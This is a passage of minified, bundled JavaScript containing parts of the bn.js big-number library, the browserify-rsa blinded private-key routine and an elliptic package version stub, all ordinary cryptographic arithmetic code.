                    Z = se
                }
                return Z !== 0 && (U.words[U.length++] = Z),
                U
            }
            ,
            w._prime = function(U) {
                if (ye[U])
                    return ye[U];
                var Z;
                if (U === "k256")
                    Z = new xe;
                else if (U === "p224")
                    Z = new Ae;
                else if (U === "p192")
                    Z = new Ee;
                else if (U === "p25519")
                    Z = new Be;
                else
                    throw new Error("Unknown prime " + U);
                return ye[U] = Z,
                Z
            }
            ;
            function ce(L) {
                if (typeof L == "string") {
                    var U = w._prime(L);
                    this.m = U.p,
                    this.prime = U
                } else
                    O(L.gtn(1), "modulus must be greater than 1"),
                    this.m = L,
                    this.prime = null
            }
            ce.prototype._verify1 = function(U) {
                O(U.negative === 0, "red works only with positives"),
                O(U.red, "red works only with red numbers")
            }
            ,
            ce.prototype._verify2 = function(U, Z) {
                O((U.negative | Z.negative) === 0, "red works only with positives"),
                O(U.red && U.red === Z.red, "red works only with red numbers")
            }
            ,
            ce.prototype.imod = function(U) {
                return this.prime ? this.prime.ireduce(U)._forceRed(this) : (V(U, U.umod(this.m)._forceRed(this)),
                U)
            }
            ,
            ce.prototype.neg = function(U) {
                return U.isZero() ? U.clone() : this.m.sub(U)._forceRed(this)
            }
            ,
            ce.prototype.add = function(U, Z) {
                this._verify2(U, Z);
                var te = U.add(Z);
                return te.cmp(this.m) >= 0 && te.isub(this.m),
                te._forceRed(this)
            }
            ,
            ce.prototype.iadd = function(U, Z) {
                this._verify2(U, Z);
                var te = U.iadd(Z);
                return te.cmp(this.m) >= 0 && te.isub(this.m),
                te
            }
            ,
            ce.prototype.sub = function(U, Z) {
                this._verify2(U, Z);
                var te = U.sub(Z);
                return te.cmpn(0) < 0 && te.iadd(this.m),
                te._forceRed(this)
            }
            ,
            ce.prototype.isub = function(U, Z) {
                this._verify2(U, Z);
                var te = U.isub(Z);
                return te.cmpn(0) < 0 && te.iadd(this.m),
                te
            }
            ,
            ce.prototype.shl = function(U, Z) {
                return this._verify1(U),
                this.imod(U.ushln(Z))
            }
            ,
            ce.prototype.imul = function(U, Z) {
                return this._verify2(U, Z),
                this.imod(U.imul(Z))
            }
            ,
            ce.prototype.mul = function(U, Z) {
                return this._verify2(U, Z),
                this.imod(U.mul(Z))
            }
            ,
            ce.prototype.isqr = function(U) {
                return this.imul(U, U.clone())
            }
            ,
            ce.prototype.sqr = function(U) {
                return this.mul(U, U)
            }
            ,
            ce.prototype.sqrt = function(U) {
                if (U.isZero())
                    return U.clone();
                var Z = this.m.andln(3);
                if (O(Z % 2 === 1),
                Z === 3) {
                    var te = this.m.add(new w(1)).iushrn(2);
                    return this.pow(U, te)
                }
                for (var se = this.m.subn(1), de = 0; !se.isZero() && se.andln(1) === 0; )
                    de++,
                    se.iushrn(1);
                O(!se.isZero());
                var re = new w(1).toRed(this)
                  , $ = re.redNeg()
                  , ie = this.m.subn(1).iushrn(1)
                  , ve = this.m.bitLength();
                for (ve = new w(2 * ve * ve).toRed(this); this.pow(ve, ie).cmp($) !== 0; )
                    ve.redIAdd($);
                for (var ge = this.pow(ve, se), Re = this.pow(U, se.addn(1).iushrn(1)), Pe = this.pow(U, se), Ie = de; Pe.cmp(re) !== 0; ) {
                    for (var Te = Pe, Le = 0; Te.cmp(re) !== 0; Le++)
                        Te = Te.redSqr();
                    O(Le < Ie);
                    var Ze = this.pow(ge, new w(1).iushln(Ie - Le - 1));
                    Re = Re.redMul(Ze),
                    ge = Ze.redSqr(),
                    Pe = Pe.redMul(ge),
                    Ie = Le
                }
                return Re
            }
            ,
            ce.prototype.invm = function(U) {
                var Z = U._invmp(this.m);
                return Z.negative !== 0 ? (Z.negative = 0,
                this.imod(Z).redNeg()) : this.imod(Z)
            }
            ,
            ce.prototype.pow = function(U, Z) {
                if (Z.isZero())
                    return new w(1).toRed(this);
                if (Z.cmpn(1) === 0)
                    return U.clone();
                var te = 4
                  , se = new Array(1 << te);
                se[0] = new w(1).toRed(this),
                se[1] = U;
                for (var de = 2; de < se.length; de++)
                    se[de] = this.mul(se[de - 1], U);
                var re = se[0]
                  , $ = 0
                  , ie = 0
                  , ve = Z.bitLength() % 26;
                for (ve === 0 && (ve = 26),
                de = Z.length - 1; de >= 0; de--) {
                    for (var ge = Z.words[de], Re = ve - 1; Re >= 0; Re--) {
                        var Pe = ge >> Re & 1;
                        if (re !== se[0] && (re = this.sqr(re)),
                        Pe === 0 && $ === 0) {
                            ie = 0;
                            continue
                        }
                        $ <<= 1,
                        $ |= Pe,
                        ie++,
                        !(ie !== te && (de !== 0 || Re !== 0)) && (re = this.mul(re, se[$]),
                        ie = 0,
                        $ = 0)
                    }
                    ve = 26
                }
                return re
            }
            ,
            ce.prototype.convertTo = function(U) {
                var Z = U.umod(this.m);
                return Z === U ? Z.clone() : Z
            }
            ,
            ce.prototype.convertFrom = function(U) {
                var Z = U.clone();
                return Z.red = null,
                Z
            }
            ,
            w.mont = function(U) {
                return new q(U)
            }
            ;
            function q(L) {
                ce.call(this, L),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(q, ce),
            q.prototype.convertTo = function(U) {
                return this.imod(U.ushln(this.shift))
            }
            ,
            q.prototype.convertFrom = function(U) {
                var Z = this.imod(U.mul(this.rinv));
                return Z.red = null,
                Z
            }
            ,
            q.prototype.imul = function(U, Z) {
                if (U.isZero() || Z.isZero())
                    return U.words[0] = 0,
                    U.length = 1,
                    U;
                var te = U.imul(Z)
                  , se = te.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , de = te.isub(se).iushrn(this.shift)
                  , re = de;
                return de.cmp(this.m) >= 0 ? re = de.isub(this.m) : de.cmpn(0) < 0 && (re = de.iadd(this.m)),
                re._forceRed(this)
            }
            ,
            q.prototype.mul = function(U, Z) {
                if (U.isZero() || Z.isZero())
                    return new w(0)._forceRed(this);
                var te = U.mul(Z)
                  , se = te.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , de = te.isub(se).iushrn(this.shift)
                  , re = de;
                return de.cmp(this.m) >= 0 ? re = de.isub(this.m) : de.cmpn(0) < 0 && (re = de.iadd(this.m)),
                re._forceRed(this)
            }
            ,
            q.prototype.invm = function(U) {
                var Z = this.imod(U._invmp(this.m).mul(this.r2));
                return Z._forceRed(this)
            }
        }
        )(_, bn$8)
    }(bn$9)),
    bn$9.exports
}
var browserifyRsa, hasRequiredBrowserifyRsa;
function requireBrowserifyRsa() {
    if (hasRequiredBrowserifyRsa)
        return browserifyRsa;
    hasRequiredBrowserifyRsa = 1;
    var _ = requireBn$4()
      , M = requireBrowser$c()
      , j = requireSafeBuffer$1().Buffer;
    function O(b) {
        var X = b.modulus.byteLength(), Y;
        do
            Y = new _(M(X));
        while (Y.cmp(b.modulus) >= 0 || !Y.umod(b.prime1) || !Y.umod(b.prime2));
        return Y
    }
    function x(b) {
        var X = O(b)
          , Y = X.toRed(_.mont(b.modulus)).redPow(new _(b.publicExponent)).fromRed();
        return {
            blinder: Y,
            unblinder: X.invm(b.modulus)
        }
    }
    function w(b, X) {
        var Y = x(X)
          , F = X.modulus.byteLength()
          , V = new _(b).mul(Y.blinder).umod(X.modulus)
          , K = V.toRed(_.mont(X.prime1))
          , Q = V.toRed(_.mont(X.prime2))
          , ee = X.coefficient
          , ae = X.prime1
          , ne = X.prime2
          , oe = K.redPow(X.exponent1).fromRed()
          , ue = Q.redPow(X.exponent2).fromRed()
          , fe = oe.isub(ue).imul(ee).umod(ae).imul(ne);
        return ue.iadd(fe).imul(Y.unblinder).umod(X.modulus).toArrayLike(j, "be", F)
    }
    return w.getr = O,
    browserifyRsa = w,
    browserifyRsa
}
var elliptic = {};
const version$1 = "6.6.1"
  , require$$0$3 = {
    version: version$1
};
var utils$8 = {}, bn$7 = {
    exports: {}
}, bn$6 = bn$7.exports, hasRequiredBn$3;
function requireBn$3() {
    return hasRequiredBn$3 || (hasRequiredBn$3 = 1,
    function(_) {
        (function(M, j) {
            function O(ce, q) {
                if (!ce)
                    throw new Error(q || "Assertion failed")
            }
            function x(ce, q) {
                ce.super_ = q;
                var L = function() {};
                L.prototype = q.prototype,
                ce.prototype = new L,
                ce.prototype.constructor = ce
            }
            function w(ce, q, L) {
                if (w.isBN(ce))
                    return ce;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                ce !== null && ((q === "le" || q === "be") && (L = q,
                q = 10),
                this._init(ce || 0, q || 10, L || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(q) {
                return q instanceof w ? !0 : q !== null && typeof q == "object" && q.constructor.wordSize === w.wordSize && Array.isArray(q.words)
            }
            ,
            w.max = function(q, L) {
                return q.cmp(L) > 0 ? q : L
            }
            ,
            w.min = function(q, L) {
                return q.cmp(L) < 0 ? q : L
            }
            ,
            w.prototype._init = function(q, L, U) {
                if (typeof q == "number")
                    return this._initNumber(q, L, U);
                if (typeof q == "object")
                    return this._initArray(q, L, U);
                L === "hex" && (L = 16),
                O(L === (L | 0) && L >= 2 && L <= 36),
                q = q.toString().replace(/\s+/g, "");
                var Z = 0;
                q[0] === "-" && (Z++,
                this.negative = 1),
                Z < q.length && (L === 16 ? this._parseHex(q, Z, U) : (this._parseBase(q, L, Z),
                U === "le" && this._initArray(this.toArray(), L, U)))
            }
            ,
            w.prototype._initNumber = function(q, L, U) {
                q < 0 && (this.negative = 1,
                q = -q),
                q < 67108864 ? (this.words = [q & 67108863],
                this.length = 1) : q < 4503599627370496 ? (this.words = [q & 67108863, q / 67108864 & 67108863],
                this.length = 2) : (O(q < 9007199254740992),
                this.words = [q & 67108863, q / 67108864 & 67108863, 1],
                this.length = 3),
                U === "le" && this._initArray(this.toArray(), L, U)
            }
            ,
            w.prototype._initArray = function(q, L, U) {
                if (O(typeof q.length == "number"),
                q.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(q.length / 3),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te, se, de = 0;
                if (U === "be")
                    for (Z = q.length - 1,
                    te = 0; Z >= 0; Z -= 3)
                        se = q[Z] | q[Z - 1] << 8 | q[Z - 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                else if (U === "le")
                    for (Z = 0,
                    te = 0; Z < q.length; Z += 3)
                        se = q[Z] | q[Z + 1] << 8 | q[Z + 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                return this.strip()
            }
            ;
            function X(ce, q) {
                var L = ce.charCodeAt(q);
                return L >= 65 && L <= 70 ? L - 55 : L >= 97 && L <= 102 ? L - 87 : L - 48 & 15
            }
            function Y(ce, q, L) {
                var U = X(ce, L);
                return L - 1 >= q && (U |= X(ce, L - 1) << 4),
                U
            }
            w.prototype._parseHex = function(q, L, U) {
                this.length = Math.ceil((q.length - L) / 6),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te = 0, se = 0, de;
                if (U === "be")
                    for (Z = q.length - 1; Z >= L; Z -= 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8;
                else {
                    var re = q.length - L;
                    for (Z = re % 2 === 0 ? L + 1 : L; Z < q.length; Z += 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8
                }
                this.strip()
            }
            ;
            function F(ce, q, L, U) {
                for (var Z = 0, te = Math.min(ce.length, L), se = q; se < te; se++) {
                    var de = ce.charCodeAt(se) - 48;
                    Z *= U,
                    de >= 49 ? Z += de - 49 + 10 : de >= 17 ? Z += de - 17 + 10 : Z += de
                }
                return Z
            }
            w.prototype._parseBase = function(q, L, U) {
                this.words = [0],
                this.length = 1;
                for (var Z = 0, te = 1; te <= 67108863; te *= L)
                    Z++;
                Z--,
                te = te / L | 0;
                for (var se = q.length - U, de = se % Z, re = Math.min(se, se - de) + U, $ = 0, ie = U; ie < re; ie += Z)
                    $ = F(q, ie, ie + Z, L),
                    this.imuln(te),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($);
                if (de !== 0) {
                    var ve = 1;
                    for ($ = F(q, ie, q.length, L),
                    ie = 0; ie < de; ie++)
                        ve *= L;
                    this.imuln(ve),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($)
                }
                this.strip()
            }
            ,
            w.prototype.copy = function(q) {
                q.words = new Array(this.length);
                for (var L = 0; L < this.length; L++)
                    q.words[L] = this.words[L];
                q.length = this.length,
                q.negative = this.negative,
                q.red = this.red
            }
            ,
            w.prototype.clone = function() {
                var q = new w(null);
                return this.copy(q),
                q
            }
            ,
            w.prototype._expand = function(q) {
                for (; this.length < q; )
                    this.words[this.length++] = 0;
                return this
            }
            ,
            w.prototype.strip = function() {
                for (; this.length > 1 && this.words[this.length - 1] === 0; )
                    this.length--;
                return this._normSign()
            }
            ,
            w.prototype._normSign = function() {
                return this.length === 1 && this.words[0] === 0 && (this.negative = 0),
                this
            }
            ,
            w.prototype.inspect = function() {
                return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
            }
            ;
            var V = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"]
              , K = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5]
              , Q = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            w.prototype.toString = function(q, L) {
                q = q || 10,
                L = L | 0 || 1;
                var U;
                if (q === 16 || q === "hex") {
                    U = "";
                    for (var Z = 0, te = 0, se = 0; se < this.length; se++) {
                        var de = this.words[se]
                          , re = ((de << Z | te) & 16777215).toString(16);
                        te = de >>> 24 - Z & 16777215,
                        Z += 2,
                        Z >= 26 && (Z -= 26,
                        se--),
                        te !== 0 || se !== this.length - 1 ? U = V[6 - re.length] + re + U : U = re + U
                    }
                    for (te !== 0 && (U = te.toString(16) + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                if (q === (q | 0) && q >= 2 && q <= 36) {
                    var $ = K[q]
                      , ie = Q[q];
                    U = "";
                    var ve = this.clone();
                    for (ve.negative = 0; !ve.isZero(); ) {
                        var ge = ve.modn(ie).toString(q);
                        ve = ve.idivn(ie),
                        ve.isZero() ? U = ge + U : U = V[$ - ge.length] + ge + U
                    }
                    for (this.isZero() && (U = "0" + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                O(!1, "Base should be between 2 and 36")
            }
            ,
            w.prototype.toNumber = function() {
                var q = this.words[0];
                return this.length === 2 ? q += this.words[1] * 67108864 : this.length === 3 && this.words[2] === 1 ? q += 4503599627370496 + this.words[1] * 67108864 : this.length > 2 && O(!1, "Number can only safely store up to 53 bits"),
                this.negative !== 0 ? -q : q
            }
            ,
            w.prototype.toJSON = function() {
                return this.toString(16)
            }
            ,
            w.prototype.toBuffer = function(q, L) {
                return O(typeof b < "u"),
                this.toArrayLike(b, q, L)
            }
            ,
            w.prototype.toArray = function(q, L) {
                return this.toArrayLike(Array, q, L)
            }
            ,
            w.prototype.toArrayLike = function(q, L, U) {
                var Z = this.byteLength()
                  , te = U || Math.max(1, Z);
                O(Z <= te, "byte array longer than desired length"),
                O(te > 0, "Requested array length <= 0"),
                this.strip();
                var se = L === "le", de = new q(te), re, $, ie = this.clone();
                if (se) {
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[$] = re;
                    for (; $ < te; $++)
                        de[$] = 0
                } else {
                    for ($ = 0; $ < te - Z; $++)
                        de[$] = 0;
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[te - $ - 1] = re
                }
                return de
            }
            ,
            Math.clz32 ? w.prototype._countBits = function(q) {
                return 32 - Math.clz32(q)
            }
            : w.prototype._countBits = function(q) {
                var L = q
                  , U = 0;
                return L >= 4096 && (U += 13,
                L >>>= 13),
                L >= 64 && (U += 7,
                L >>>= 7),
                L >= 8 && (U += 4,
                L >>>= 4),
                L >= 2 && (U += 2,
                L >>>= 2),
                U + L
            }
            ,
            w.prototype._zeroBits = function(q) {
                if (q === 0)
                    return 26;
                var L = q
                  , U = 0;
                return (L & 8191) === 0 && (U += 13,
                L >>>= 13),
                (L & 127) === 0 && (U += 7,
                L >>>= 7),
                (L & 15) === 0 && (U += 4,
                L >>>= 4),
                (L & 3) === 0 && (U += 2,
                L >>>= 2),
                (L & 1) === 0 && U++,
                U
            }
            ,
            w.prototype.bitLength = function() {
                var q = this.words[this.length - 1]
                  , L = this._countBits(q);
                return (this.length - 1) * 26 + L
            }
            ;
            function ee(ce) {
                for (var q = new Array(ce.bitLength()), L = 0; L < q.length; L++) {
                    var U = L / 26 | 0
                      , Z = L % 26;
                    q[L] = (ce.words[U] & 1 << Z) >>> Z
                }
                return q
            }
            w.prototype.zeroBits = function() {
                if (this.isZero())
                    return 0;
                for (var q = 0, L = 0; L < this.length; L++) {
                    var U = this._zeroBits(this.words[L]);
                    if (q += U,
                    U !== 26)
                        break
                }
                return q
            }
            ,
            w.prototype.byteLength = function() {
                return Math.ceil(this.bitLength() / 8)
            }
            ,
            w.prototype.toTwos = function(q) {
                return this.negative !== 0 ? this.abs().inotn(q).iaddn(1) : this.clone()
            }
            ,
            w.prototype.fromTwos = function(q) {
                return this.testn(q - 1) ? this.notn(q).iaddn(1).ineg() : this.clone()
            }
            ,
            w.prototype.isNeg = function() {
                return this.negative !== 0
            }
            ,
            w.prototype.neg = function() {
                return this.clone().ineg()
            }
            ,
            w.prototype.ineg = function() {
                return this.isZero() || (this.negative ^= 1),
                this
            }
            ,
            w.prototype.iuor = function(q) {
                for (; this.length < q.length; )
                    this.words[this.length++] = 0;
                for (var L = 0; L < q.length; L++)
                    this.words[L] = this.words[L] | q.words[L];
                return this.strip()
            }
            ,
            w.prototype.ior = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuor(q)
            }
            ,
            w.prototype.or = function(q) {
                return this.length > q.length ? this.clone().ior(q) : q.clone().ior(this)
            }
            ,
            w.prototype.uor = function(q) {
                return this.length > q.length ? this.clone().iuor(q) : q.clone().iuor(this)
            }
            ,
            w.prototype.iuand = function(q) {
                var L;
                this.length > q.length ? L = q : L = this;
                for (var U = 0; U < L.length; U++)
                    this.words[U] = this.words[U] & q.words[U];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.iand = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuand(q)
            }
            ,
            w.prototype.and = function(q) {
                return this.length > q.length ? this.clone().iand(q) : q.clone().iand(this)
            }
            ,
            w.prototype.uand = function(q) {
                return this.length > q.length ? this.clone().iuand(q) : q.clone().iuand(this)
            }
            ,
            w.prototype.iuxor = function(q) {
                var L, U;
                this.length > q.length ? (L = this,
                U = q) : (L = q,
                U = this);
                for (var Z = 0; Z < U.length; Z++)
                    this.words[Z] = L.words[Z] ^ U.words[Z];
                if (this !== L)
                    for (; Z < L.length; Z++)
                        this.words[Z] = L.words[Z];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.ixor = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuxor(q)
            }
            ,
            w.prototype.xor = function(q) {
                return this.length > q.length ? this.clone().ixor(q) : q.clone().ixor(this)
            }
            ,
            w.prototype.uxor = function(q) {
                return this.length > q.length ? this.clone().iuxor(q) : q.clone().iuxor(this)
            }
            ,
            w.prototype.inotn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = Math.ceil(q / 26) | 0
                  , U = q % 26;
                this._expand(L),
                U > 0 && L--;
                for (var Z = 0; Z < L; Z++)
                    this.words[Z] = ~this.words[Z] & 67108863;
                return U > 0 && (this.words[Z] = ~this.words[Z] & 67108863 >> 26 - U),
                this.strip()
            }
            ,
            w.prototype.notn = function(q) {
                return this.clone().inotn(q)
            }
            ,
            w.prototype.setn = function(q, L) {
                O(typeof q == "number" && q >= 0);
                var U = q / 26 | 0
                  , Z = q % 26;
                return this._expand(U + 1),
                L ? this.words[U] = this.words[U] | 1 << Z : this.words[U] = this.words[U] & ~(1 << Z),
                this.strip()
            }
            ,
            w.prototype.iadd = function(q) {
                var L;
                if (this.negative !== 0 && q.negative === 0)
                    return this.negative = 0,
                    L = this.isub(q),
                    this.negative ^= 1,
                    this._normSign();
                if (this.negative === 0 && q.negative !== 0)
                    return q.negative = 0,
                    L = this.isub(q),
                    q.negative = 1,
                    L._normSign();
                var U, Z;
                this.length > q.length ? (U = this,
                Z = q) : (U = q,
                Z = this);
                for (var te = 0, se = 0; se < Z.length; se++)
                    L = (U.words[se] | 0) + (Z.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                for (; te !== 0 && se < U.length; se++)
                    L = (U.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                if (this.length = U.length,
                te !== 0)
                    this.words[this.length] = te,
                    this.length++;
                else if (U !== this)
                    for (; se < U.length; se++)
                        this.words[se] = U.words[se];
                return this
            }
            ,
            w.prototype.add = function(q) {
                var L;
                return q.negative !== 0 && this.negative === 0 ? (q.negative = 0,
                L = this.sub(q),
                q.negative ^= 1,
                L) : q.negative === 0 && this.negative !== 0 ? (this.negative = 0,
                L = q.sub(this),
                this.negative = 1,
                L) : this.length > q.length ? this.clone().iadd(q) : q.clone().iadd(this)
            }
            ,
            w.prototype.isub = function(q) {
                if (q.negative !== 0) {
                    q.negative = 0;
                    var L = this.iadd(q);
                    return q.negative = 1,
                    L._normSign()
                } else if (this.negative !== 0)
                    return this.negative = 0,
                    this.iadd(q),
                    this.negative = 1,
                    this._normSign();
                var U = this.cmp(q);
                if (U === 0)
                    return this.negative = 0,
                    this.length = 1,
                    this.words[0] = 0,
                    this;
                var Z, te;
                U > 0 ? (Z = this,
                te = q) : (Z = q,
                te = this);
                for (var se = 0, de = 0; de < te.length; de++)
                    L = (Z.words[de] | 0) - (te.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                for (; se !== 0 && de < Z.length; de++)
                    L = (Z.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                if (se === 0 && de < Z.length && Z !== this)
                    for (; de < Z.length; de++)
                        this.words[de] = Z.words[de];
                return this.length = Math.max(this.length, de),
                Z !== this && (this.negative = 1),
                this.strip()
            }
            ,
            w.prototype.sub = function(q) {
                return this.clone().isub(q)
            }
            ;
            function ae(ce, q, L) {
                L.negative = q.negative ^ ce.negative;
                var U = ce.length + q.length | 0;
                L.length = U,
                U = U - 1 | 0;
                var Z = ce.words[0] | 0
                  , te = q.words[0] | 0
                  , se = Z * te
                  , de = se & 67108863
                  , re = se / 67108864 | 0;
                L.words[0] = de;
                for (var $ = 1; $ < U; $++) {
                    for (var ie = re >>> 26, ve = re & 67108863, ge = Math.min($, q.length - 1), Re = Math.max(0, $ - ce.length + 1); Re <= ge; Re++) {
                        var Pe = $ - Re | 0;
                        Z = ce.words[Pe] | 0,
                        te = q.words[Re] | 0,
                        se = Z * te + ve,
                        ie += se / 67108864 | 0,
                        ve = se & 67108863
                    }
                    L.words[$] = ve | 0,
                    re = ie | 0
                }
                return re !== 0 ? L.words[$] = re | 0 : L.length--,
                L.strip()
            }
            var ne = function(q, L, U) {
                var Z = q.words, te = L.words, se = U.words, de = 0, re, $, ie, ve = Z[0] | 0, ge = ve & 8191, Re = ve >>> 13, Pe = Z[1] | 0, Ie = Pe & 8191, Te = Pe >>> 13, Le = Z[2] | 0, Ze = Le & 8191, $e = Le >>> 13, Ne = Z[3] | 0, qe = Ne & 8191, Ve = Ne >>> 13, lt = Z[4] | 0, nt = lt & 8191, je = lt >>> 13, Ke = Z[5] | 0, Qe = Ke & 8191, We = Ke >>> 13, mt = Z[6] | 0, ct = mt & 8191, vt = mt >>> 13, we = Z[7] | 0, _e = we & 8191, Ce = we >>> 13, st = Z[8] | 0, et = st & 8191, tt = st >>> 13, He = Z[9] | 0, ke = He & 8191, Me = He >>> 13, Ue = te[0] | 0, rt = Ue & 8191, dt = Ue >>> 13, Et = te[1] | 0, ft = Et & 8191, gt = Et >>> 13, Yt = te[2] | 0, Ct = Yt & 8191, Ot = Yt >>> 13, Vt = te[3] | 0, Pt = Vt & 8191, Bt = Vt >>> 13, xr = te[4] | 0, Dt = xr & 8191, Ft = xr >>> 13, Mr = te[5] | 0, at = Mr & 8191, ze = Mr >>> 13, Je = te[6] | 0, ht = Je & 8191, _t = Je >>> 13, Ge = te[7] | 0, Ye = Ge & 8191, it = Ge >>> 13, Fe = te[8] | 0, ut = Fe & 8191, wt = Fe >>> 13, At = te[9] | 0, St = At & 8191, Tt = At >>> 13;
                U.negative = q.negative ^ L.negative,
                U.length = 19,
                re = Math.imul(ge, rt),
                $ = Math.imul(ge, dt),
                $ = $ + Math.imul(Re, rt) | 0,
                ie = Math.imul(Re, dt);
                var er = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (er >>> 26) | 0,
                er &= 67108863,
                re = Math.imul(Ie, rt),
                $ = Math.imul(Ie, dt),
                $ = $ + Math.imul(Te, rt) | 0,
                ie = Math.imul(Te, dt),
                re = re + Math.imul(ge, ft) | 0,
                $ = $ + Math.imul(ge, gt) | 0,
                $ = $ + Math.imul(Re, ft) | 0,
                ie = ie + Math.imul(Re, gt) | 0;
                var Xt = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Xt >>> 26) | 0,
                Xt &= 67108863,
                re = Math.imul(Ze, rt),
                $ = Math.imul(Ze, dt),
                $ = $ + Math.imul($e, rt) | 0,
                ie = Math.imul($e, dt),
                re = re + Math.imul(Ie, ft) | 0,
                $ = $ + Math.imul(Ie, gt) | 0,
                $ = $ + Math.imul(Te, ft) | 0,
                ie = ie + Math.imul(Te, gt) | 0,
                re = re + Math.imul(ge, Ct) | 0,
                $ = $ + Math.imul(ge, Ot) | 0,
                $ = $ + Math.imul(Re, Ct) | 0,
                ie = ie + Math.imul(Re, Ot) | 0;
                var pr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (pr >>> 26) | 0,
                pr &= 67108863,
                re = Math.imul(qe, rt),
                $ = Math.imul(qe, dt),
                $ = $ + Math.imul(Ve, rt) | 0,
                ie = Math.imul(Ve, dt),
                re = re + Math.imul(Ze, ft) | 0,
                $ = $ + Math.imul(Ze, gt) | 0,
                $ = $ + Math.imul($e, ft) | 0,
                ie = ie + Math.imul($e, gt) | 0,
                re = re + Math.imul(Ie, Ct) | 0,
                $ = $ + Math.imul(Ie, Ot) | 0,
                $ = $ + Math.imul(Te, Ct) | 0,
                ie = ie + Math.imul(Te, Ot) | 0,
                re = re + Math.imul(ge, Pt) | 0,
                $ = $ + Math.imul(ge, Bt) | 0,
                $ = $ + Math.imul(Re, Pt) | 0,
                ie = ie + Math.imul(Re, Bt) | 0;
                var or = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (or >>> 26) | 0,
                or &= 67108863,
                re = Math.imul(nt, rt),
                $ = Math.imul(nt, dt),
                $ = $ + Math.imul(je, rt) | 0,
                ie = Math.imul(je, dt),
                re = re + Math.imul(qe, ft) | 0,
                $ = $ + Math.imul(qe, gt) | 0,
                $ = $ + Math.imul(Ve, ft) | 0,
                ie = ie + Math.imul(Ve, gt) | 0,
                re = re + Math.imul(Ze, Ct) | 0,
                $ = $ + Math.imul(Ze, Ot) | 0,
                $ = $ + Math.imul($e, Ct) | 0,
                ie = ie + Math.imul($e, Ot) | 0,
                re = re + Math.imul(Ie, Pt) | 0,
                $ = $ + Math.imul(Ie, Bt) | 0,
                $ = $ + Math.imul(Te, Pt) | 0,
                ie = ie + Math.imul(Te, Bt) | 0,
                re = re + Math.imul(ge, Dt) | 0,
                $ = $ + Math.imul(ge, Ft) | 0,
                $ = $ + Math.imul(Re, Dt) | 0,
                ie = ie + Math.imul(Re, Ft) | 0;
                var yr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (yr >>> 26) | 0,
